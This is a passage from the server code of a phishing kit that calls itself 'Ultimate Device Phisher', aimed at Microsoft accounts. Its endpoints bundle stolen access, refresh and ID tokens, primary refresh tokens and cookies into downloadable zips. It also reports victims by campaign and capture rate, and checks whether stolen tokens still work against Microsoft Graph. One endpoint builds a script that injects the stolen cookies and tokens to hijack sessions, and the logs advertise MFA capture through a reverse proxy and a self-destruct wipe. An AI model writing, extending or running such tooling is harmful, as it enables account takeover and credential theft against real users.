            text: `📣 **Dashboard Test Successful** at ${new Date().toISOString()}`,
            parse_mode: 'Markdown'
        }, { timeout: 5000, ...createAxiosConfig() });
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/export', async (req, res) => {
    const flows = await getAllFlows();
    const zip = new AdmZip();
    zip.addFile('flows.json', Buffer.from(JSON.stringify(flows, null, 2)));
    for (const f of flows) {
        if (f.access_token || f.refresh_token || f.id_token || f.prt) {
            let txt = `Session: ${f.session_id}\nEmail: ${f.username || 'Unknown'}\nCreated: ${f.created}\nCampaign: ${f.campaign}\n\n`;
            if (f.access_token) txt += `ACCESS_TOKEN:\n${f.access_token}\n\n`;
            if (f.refresh_token) txt += `REFRESH_TOKEN:\n${f.refresh_token}\n\n`;
            if (f.id_token) txt += `ID_TOKEN:\n${f.id_token}\n\n`;
            if (f.prt) txt += `PRT:\n${f.prt}\n\n`;
            if (f.cookies && f.cookies.length) txt += `COOKIES:\n${f.cookies.join('\n')}\n\n`;
            zip.addFile(`session_${f.session_id}.txt`, Buffer.from(txt));
        }
    }
    const zipBuffer = zip.toBuffer();
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
    res.send(zipBuffer);
});

app.get('/api/report', async (req, res) => {
    const flows = await getAllFlows();
    let html = `<html><head><style>body{font-family:sans-serif;} table{border-collapse:collapse;width:100%;} th,td{border:1px solid #ddd;padding:8px;} th{background:#f2f2f2;}</style></head><body>
        <h1>Phisher Report</h1><p>Generated: ${new Date().toISOString()}</p>
        <table><tr><th>Session</th><th>Email</th><th>Status</th><th>Created</th><th>Campaign</th></tr>`;
    for (const f of flows) {
        html += `<tr><td>${f.session_id.slice(0,8)}...</td><td>${f.username||'Unknown'}</td><td>${f.status}</td><td>${new Date(f.created).toLocaleString()}</td><td>${f.campaign||'default'}</td></tr>`;
    }
    html += `</table></body></html>`;
    res.setHeader('Content-Type', 'text/html');
    res.setHeader('Content-Disposition', 'attachment; filename=report.html');
    res.send(html);
});

app.get('/api/analytics', async (req, res) => {
    const flows = await getAllFlows();
    const visits = flows.filter(f => f.visit_notified).length;
    const captures = flows.filter(f => f.status === 'approved').length;
    const daily = {};
    for (const f of flows) {
        const day = new Date(f.created).toISOString().split('T')[0];
        if (!daily[day]) daily[day] = { visits: 0, captures: 0 };
        if (f.visit_notified) daily[day].visits++;
        if (f.status === 'approved') daily[day].captures++;
    }
    const labels = Object.keys(daily).sort();
    const visitsData = labels.map(d => daily[d].visits);
    const capturesData = labels.map(d => daily[d].captures);
    res.json({
        totalVisits: visits,
        totalCaptures: captures,
        conversionRate: visits > 0 ? (captures / visits * 100).toFixed(1) : 0,
        labels,
        visitsData,
        capturesData
    });
});

app.get('/api/replay/:sessionId', async (req, res) => {
    const flow = await getFlowBySessionId(req.params.sessionId);
    if (!flow) return res.status(404).json({ error: 'not found' });
    const cookies = flow.cookies || [];
    const token = flow.access_token || '';
    const script = `(function() {
        const cookies = ${JSON.stringify(cookies)};
        const token = '${token}';
        cookies.forEach(c => { document.cookie = c + '; path=/; domain=login.microsoftonline.com; Secure; SameSite=None'; });
        if (token) localStorage.setItem('access_token', token);
        alert('Cookies and token injected. You can now login.');
        window.location.href = 'https://login.microsoftonline.com';
    })();`;
    res.json({ replayScript: script });
});

// ── WebSocket ──
const wsServer = new WebSocket.Server({ noServer: true });
const wsClients = new Set();
wsServer.on('connection', (ws) => { wsClients.add(ws); ws.on('close', () => wsClients.delete(ws)); });
function broadcast(data) { const msg = JSON.stringify(data); for (const client of wsClients) { if (client.readyState === WebSocket.OPEN) client.send(msg); } }

// ── Health Check ──
app.get('/api/health', async (req, res) => {
    const flows = await getAllFlows();
    const results = [];
    for (const flow of flows) {
        if (flow.access_token) {
            try {
                const resp = await axios.get('https://graph.microsoft.com/v1.0/me', {
                    headers: { Authorization: `Bearer ${flow.access_token}` },
                    timeout: 5000,
                    ...createAxiosConfig()
                });
                results.push({ session: flow.session_id, valid: true, user: resp.data.userPrincipalName });
            } catch (e) {
                results.push({ session: flow.session_id, valid: false, error: e.message });
            }
        }
    }
    res.json(results);
});

// ── 404 ──
app.use((req, res) => res.status(404).send('404 Not Found'));

// ── Server ──
const server = http.createServer(app);
server.on('upgrade', (req, socket, head) => {
    if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
});
server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Ultimate Device Phisher v5.4.1 – Order Fix running on port ${PORT}`);
    console.log(`📱 Device page: http://localhost:${PORT}/device`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
    console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
    console.log(`🛡️ IP Whitelist: ${ALLOWED_IPS.length > 0 ? ALLOWED_IPS.join(', ') : 'DISABLED'}`);
    console.log(`📁 Campaigns: active`);
    console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
    console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
    console.log(`🚀 Full reverse-proxy with automatic MFA capture: ACTIVE`);
    console.log(`⚠️ REMINDER: Delete public/login.html to avoid static file interception.`);
});

process.on('SIGTERM', () => server.close(() => process.exit(0)));
process.on('SIGINT', () => server.close(() => process.exit(0)));
